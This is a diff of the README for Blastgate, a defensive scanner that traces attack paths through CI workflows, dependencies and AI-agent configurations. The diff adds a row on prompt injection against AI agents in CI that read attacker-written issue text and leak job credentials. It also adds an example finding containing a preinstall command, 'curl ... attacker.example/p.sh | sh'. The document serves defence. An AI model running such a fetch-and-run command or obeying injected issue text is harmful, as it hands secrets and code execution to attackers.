@@ -34,6 +34,11 @@ one engine, so every surface produces identical findings.
 - **Teams adopting coding agents / MCP servers.** Committed `.mcp.json` and
   `.claude/settings.json` grants are a blast radius most teams never audit. Blastgate
   measures it and flags over-privilege against a least-privilege baseline.
+- **Teams running AI agents in CI** (claude-code-action, codex-action, run-gemini-cli).
+  An agent that reads issue or PR text while holding secrets is a prompt-injection
+  path. Blastgate judges each agent step against the Agents Rule of Two and fails only
+  when an outsider can trigger it, its tools can read a credential, and it can get data
+  out.
 - **npm / PyPI / RubyGems maintainers** worried about supply-chain compromise —
   install-time execution and newly introduced dependencies, evaluated offline from the
   lockfile (plus opt-in npm provenance regressions).
@@ -48,13 +53,15 @@ Each row below is a live 2026 attack shape, and each is invisible to any single-
 tool because the danger is the _connective_ path — the row's middle column — not any
 one artifact on it:
 
-| Threat                                                                                                                               | The concrete path Blastgate catches                                                                                                                         | OWASP             |
-| ------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------- |
-| **Install-script supply-chain worm** (e.g. Shai-Hulud: a `preinstall` stealer that sweeps npm/GitHub/AWS/Vault creds and propagates) | A newly added dependency's install script runs in a `pull_request_target` job that holds `AWS_SECRET_ACCESS_KEY`                                            | `ASI04` / `MCP04` |
-| **CI `pwn-request`**                                                                                                                 | A `pull_request_target` (or `workflow_run` / issue-comment) job runs untrusted code while holding secrets or an over-broad `GITHUB_TOKEN`                   | `ASI03`           |
-| **npm provenance regression** (the CVE-2025-54313 shape)                                                                             | A dependency that _had_ npm attestations and silently _lost_ them between versions — a strong compromise signal (opt-in, `--provenance`)                    | `ASI04` / `MCP04` |
-| **Over-privileged coding agent**                                                                                                     | A committed MCP server rooted at `/` or an unrestricted `Bash(*)` / wrapper-bypass grant — a prompt-injectable path to out-of-repo filesystem/network/shell | `ASI01` / `MCP02` |
-| **Slopsquatting & unsigned agent marketplaces**                                                                                      | A newly introduced dependency or agent grant from an unaudited source, evaluated for reachability rather than trusted by name                               | `ASI04` / `MCP02` |
+| Threat                                                                                                                               | The concrete path Blastgate catches                                                                                                                                | OWASP             |
+| ------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------- |
+| **Install-script supply-chain worm** (e.g. Shai-Hulud: a `preinstall` stealer that sweeps npm/GitHub/AWS/Vault creds and propagates) | A newly added dependency's install script runs in a `pull_request_target` job that holds `AWS_SECRET_ACCESS_KEY`                                                   | `ASI04` / `MCP04` |
+| **CI `pwn-request`**                                                                                                                 | A `pull_request_target` (or `workflow_run` / issue-comment) job checks out and runs PR code while holding secrets, a `contents: write` token, or `id-token: write` | `ASI03`           |
+| **Workflow script injection**                                                                                                        | An issue title, comment, or downloaded artifact is spliced into a `run:` or github-script step in a job that holds a secret or code-write token                    | `ASI01` / `MCP10` |
+| **Agent-in-CI prompt injection** (PromptPwnd)                                                                                        | An outsider-triggerable AI agent step reads attacker text, has a shell or file tool that can read a job credential, and has a way to get it out                    | `ASI01` / `MCP10` |
+| **npm provenance regression** (the CVE-2025-54313 shape)                                                                             | A dependency that _had_ npm attestations and silently _lost_ them between versions — a strong compromise signal (opt-in, `--provenance`)                           | `ASI04` / `MCP04` |
+| **Over-privileged coding agent**                                                                                                     | A committed MCP server rooted at `/` or an unrestricted `Bash(*)` / wrapper-bypass grant — a prompt-injectable path to out-of-repo filesystem/network/shell        | `ASI01` / `MCP02` |
+| **Slopsquatting & unsigned agent marketplaces**                                                                                      | A newly introduced dependency or agent grant from an unaudited source, evaluated for reachability rather than trusted by name                                      | `ASI04` / `MCP02` |
 
 Each of these is named and modeled in [`docs/threat-model.md`](docs/threat-model.md),
 which also maps every OWASP category Blastgate emits.
@@ -65,6 +72,7 @@ which also maps every OWASP category Blastgate emits.
 ✗ FAIL  added dependency evil-pkg@1.0.0 → evil-pkg@1.0.0 → .github/workflows/ci.yml#test → AWS_SECRET_ACCESS_KEY
       sink: credential AWS_SECRET_ACCESS_KEY  [ASI04:2026, MCP04:2025]
       at:   .github/workflows/ci.yml:9 → AWS_SECRET_ACCESS_KEY
+      e.g.: The PR adds a dependency with "preinstall": "curl -s https://attacker.example/p.sh | sh"
       why:  New or changed dependency evil-pkg@1.0.0 declares an install script that executes in job
             .github/workflows/ci.yml#test, which a fork PR triggers via pull_request_target (base-repo
             context, so it carries repo secrets) and which holds credential AWS_SECRET_ACCESS_KEY,
@@ -93,7 +101,10 @@ workflows, and agent/MCP configuration.
   credential path), **GitLab CI**
   (merge-request pipelines, CI/CD variables), and **CircleCI** (advisory only: its
   forked-PR-secret exposure is a project setting outside the repo — Blastgate surfaces
-  it rather than falsely passing; see the threat model).
+  it rather than falsely passing; see the threat model). It also classifies where
+  untrusted event text lands (a shell, an agent, an action input) and assesses each AI
+  agent step against a cited, versioned profile of that action's trigger gate and tool
+  defaults.
 - **Agent / MCP layer** — the filesystem, network, shell, and tool capabilities granted
   by committed agent/MCP configuration, checked against a least-privilege baseline.
 
@@ -110,12 +121,16 @@ Precision is the primary design constraint. A check fails only on a proven explo
 attacker-controlled input reaches an execution sink (a shell or inline script, or a spliced
 artifact) in a privileged job that holds a secret, a code-write token, or an OIDC
 `id-token: write` grant. Every fail cites the `file:line` where the input lands and the
-capability it reaches. Paths Blastgate can reach but not prove — a coding agent reading
-issue text, text handed to a third-party action, a token that can only write PRs or
-issues — are warnings. The full contract is in
+capability it reaches. An AI agent in CI (claude-code-action, codex-action, run-gemini-cli)
+fails only when all three legs of the Agents Rule of Two hold: an outsider can trigger it,
+its tools can read a credential the job holds, and it has a way to get data out. Paths
+Blastgate can reach but not prove are warnings. That covers an agent missing a leg, a
+tool-less LLM step reading issue text, text handed to a third-party action, and a token
+that can only write PRs or issues. The full contract is in
 [`docs/threat-model.md` §3.4](docs/threat-model.md#34-the-gate-precision-over-recall--r14);
 its effect on 50 popular repos is in
-[`docs/evaluations/2026-09-29-precision-core-rescan.md`](docs/evaluations/2026-09-29-precision-core-rescan.md).
+[`docs/evaluations/2026-09-29-precision-core-rescan.md`](docs/evaluations/2026-09-29-precision-core-rescan.md)
+and [`docs/evaluations/2026-10-01-agent-model-rescan.md`](docs/evaluations/2026-10-01-agent-model-rescan.md).
 The presence of a pattern alone does not produce a finding. A `postinstall` script
 in a job that holds no secrets and is not triggerable by untrusted input is not
 reported. This keeps findings actionable and avoids the false-positive rate of
@@ -138,8 +153,8 @@ signals into a path. The full tool-by-tool contrast is in
 
 ## Interfaces
 
-- **CI/PR gate** — exits non-zero on a reachable path and surfaces the finding on the
-  pull request.
+- **CI/PR gate** (GitHub Action) — exits non-zero on a proven exploit (or a run it could
+  not evaluate) and surfaces the finding on the pull request.
 - **Local CLI** — runs against the same repository and produces the same findings.
 - **Claude Code plugin** (`plugin/`) — enforces the same gate inside an agent session
   as deterministic hooks on commit and dependency installation, and exposes an advisory
@@ -170,15 +185,20 @@ passes in CI for the same reason — the surfaces cannot disagree.
 npx blastgate .                 # scan the current repo; exits non-zero on a fail verdict
 npx blastgate . --base main     # add diff signals (new deps, .npmrc changes) vs a ref
 npx blastgate . --provenance    # opt-in npm provenance-regression check (needs --base)
+npx blastgate . --public        # the repo is public: Actions logs count as an agent exfil channel
 npx blastgate . --json          # emit the findings array as JSON (has each finding `id`)
+npx blastgate . --json --include-payloads   # also include each fail's example payload (local use only)
 npx blastgate . --format md      # human-readable markdown report (share it, or > report.md)
 npx blastgate . --advisories     # opt-in CVE/advisory enrichment of reachable deps (never gates)
 npx blastgate . --record runs/   # append a run record for the trend dashboard
 npx blastgate report runs/ --out trend.html   # static HTML trend over recorded runs
 ```
 
-A fail verdict (a reachable path to a secret or credential) exits non-zero; a clean
-repo or warn-only findings (lower-sensitivity capability paths) exit zero. The
+A fail verdict (a proven exploit path to a secret or code-write credential) exits
+non-zero, and so does `unknown` (a layer could not be evaluated; never treated as a
+pass). A clean repo or warn-only findings exit zero. Each fail cites the `file:line`
+where attacker input lands. Local text output also shows an illustrative payload; the
+markdown report, the Action, the MCP tool, and run records never do. The
 `--format md` report leads with the verdict and a "where this runs" banner, gives one
 section per finding (the attacker→sink path, why it is reachable, the fix, and the
 OWASP label), and closes with what to do next — it is the same report the Action posts
@@ -215,6 +235,10 @@ jobs:
 - **CI providers** — GitHub Actions and GitLab CI (full gate), CircleCI (advisory only —
   the fork-secret toggle is out-of-repo).
 - **Agent / MCP** — committed grants checked against a least-privilege baseline.
+- **AI agents in CI** — `claude-code-action`, `codex-action`, and `run-gemini-cli`
+  assessed against the Agents Rule of Two; tool-less LLM steps (`actions/ai-inference`)
+  warn only. Pass `--public` (the Action reads it from the event) so public Actions logs
+  count as an exfiltration channel.
 - **Exceptions** — `.blastgate/policy.json` / `acknowledged.json` (auditable, specific,
   self-approval-guarded).
 - **Opt-in enrichment** — npm provenance regressions (`--provenance`) and CVE/GHSA
@@ -238,7 +262,10 @@ Functional across all surfaces, ecosystems, and CI providers. One engine backs t
 (GitHub, GitLab, advisory CircleCI), the exception-policy engine, opt-in provenance and
 CVE-advisory enrichment, and the run-record trend report are all wired, and the engine is
 covered by unit tests plus a fixture-repo regression suite (a true-positive and
-true-negative repo per shipped check). Remaining before a public release: publishing the
+true-negative repo per shipped check, with fail evidence required on every fail). The
+proven-exploit contract and the agent model were re-scanned against 50 popular repos
+([`docs/evaluations/`](docs/evaluations)). For how the code is organized, see
+[`docs/architecture.md`](docs/architecture.md). Remaining before a public release: publishing the
 Action's built artifact for third-party consumers.
 
 ## License
